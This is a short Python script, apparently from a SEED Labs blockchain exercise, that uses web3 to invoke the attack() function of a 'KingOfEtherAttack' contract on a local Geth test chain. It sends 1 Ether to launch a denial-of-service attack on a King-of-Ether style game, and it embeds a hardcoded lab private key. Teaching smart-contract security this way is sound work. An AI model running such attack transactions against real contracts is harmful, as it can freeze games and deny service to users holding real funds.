#!/usr/bin/env python3

from web3 import Web3
import sys
import os

# Add the shared folder to sys.path
sys.path.append(os.path.abspath("../shared"))

import SEEDWeb3

# Connect to the Geth PoA node
web3 = SEEDWeb3.connect_to_geth_pos('http://10.151.0.71:8545')

# Attacker's private key and account
private_key = "6510652e04c9bcb471982164cf779fc0b624bb26bc3cfe5a8a54bddeba90d667"
attacker_account = web3.eth.account.from_key(private_key).address

# Load ABI and attack contract
abi_file = "../contract/KingOfEtherAttack.abi"

# attack_addr = "put address here"
attack_addr = "0x2c0fc781D143654032C172A5F71491C7cB083581"

contract_abi = SEEDWeb3.getFileContent(abi_file)
contract = web3.eth.contract(address=attack_addr, abi=contract_abi)

# Amount to send (e.g., 1 Ether)
attack_value = web3.to_wei(1, 'ether')

# Send the attack transaction
print("Launching DoS attack...")
nonce = web3.eth.get_transaction_count(attacker_account)

transaction = contract.functions.attack().build_transaction({
    'from': attacker_account,
    'value': attack_value,
    'nonce': nonce,
    'gas': 500000,
    'gasPrice': web3.to_wei('10', 'gwei'),
    'chainId': 1337
})

signed_tx = web3.eth.account.sign_transaction(transaction, private_key)
tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)

print("Transaction sent, waiting for block confirmation...")
tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)

print(f"✅ Attack completed. Transaction Hash: {tx_hash.hex()}")
print("📦 Transaction Receipt:")
print(tx_receipt)